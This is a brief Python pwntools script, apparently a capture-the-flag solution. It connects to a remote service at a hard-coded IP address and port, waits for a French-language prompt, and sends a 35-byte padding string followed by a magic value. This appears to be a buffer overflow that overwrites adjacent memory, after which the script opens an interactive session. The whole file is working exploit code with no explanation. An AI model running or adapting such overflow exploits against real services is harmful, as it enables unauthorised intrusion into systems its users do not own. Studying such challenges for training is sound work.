#! /usr/bin/python2.7
# -*- coding: utf-8 -*-

from pwn import *

p = remote("159.203.46.23",4445)

p.recvuntil("Poste ton message ici:")

p.sendline("A"*35+"\x13\x37\x13\x37")

print(p.recv())

p.interactive()